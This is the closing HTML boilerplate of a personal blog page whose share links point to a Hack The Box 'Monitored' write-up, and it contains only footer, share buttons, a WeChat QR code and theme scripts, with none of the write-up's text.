            <span>footer.license</span> --->
        </p>
    </div>
    <div class="bottom">
        <p><span>Lucifiel &copy; 2020 - 2025</span>
            <span>
                
                Power by Lucifiel</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2024/01/16/Hackthebox/Medium/Monitored-Hackthebox/&title=《Monitored - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2024/01/16/Hackthebox/Medium/Monitored-Hackthebox/&title=《Monitored - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2024/01/16/Hackthebox/Medium/Monitored-Hackthebox/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Monitored - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2024/01/16/Hackthebox/Medium/Monitored-Hackthebox/&via=http://www.lucifiel.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2024/01/16/Hackthebox/Medium/Monitored-Hackthebox/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACnElEQVR42u3aQW4kIRAEQP//094HrHqcWQXjsRScLJnuJjgAk8XXV9y+/2tJ/6dnn97wumfy3WHDw8PDWw/96dV5n9df2bDz8eDh4eHd5iWL+37QyXL/NNB8PHh4eHifxmsX8eSoPZtEPDw8vL/FOzyI8m14eHh4n8BrI9TXR+F9VDGLhvHw8PDew8urSJ/z95X6Hh4eHt66qv56wU1i1iSibZ8qRouHh4d3gbeJBmbU/eWtepx4eHh4l3mzEKENLGZvGMbEeHh4eBd4+b/317N+d9vAw8PDO8XLi/Szg/XmON6GvD/U9/Dw8PDWvE2Zvz2Ob/CrCwF4eHh4F3g3woLkqYS0+iIeHh7eBd5mWHkAceOdRXSLh4eHd5SXL835oTY/Uicx7mwLedz38PDw8N7CS4KMdmpmU1YHwXh4eHgXeMnxt90khot4MDV53IyHh4f3Hl5+jWk/xHb6jpXH8PDw8Na8vMjU9k+mKZ+sdgPDw8PDu81r95AcPNs82otZjz3x8PDwrvFml5zagGBf02+nDA8PD+8eLy8ptZi2535qhl3x8PDwYt5msW4vV7XIUwU2PDw8vLO8vFiVRwD5Naz20lUeNBcndDw8PLySlyzrebE/CXPzwSXTHR3x8fDw8N7Oaz/cBsH5Za/hNoOHh4d3mXcP05a1Zj1/2Bjw8PDwjvLaH/mnAoVNpBs9hYeHh3eU91222WWCNozYlNnw8PDwbvM2+0kSMcyC4NlGtWp4eHh4JW/2mc11gfywnm8MRUqNh4eHd4iXLOjJ59s+ybH7wJ6Gh4eH96u8PHRIrgu0E5FPJR4eHt7n8PIj7yzA3QQZ1/c9PDw8vLdfjWqz1vYKwuPGgIeHh3eUt/lFPyuYzdhf9xoeHh5e2v4BRzIr8OdADkEAAAAASUVORK5CYII=" alt="微信分享二维码">
</div>




    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: false };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>






<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->





</body>
</html>
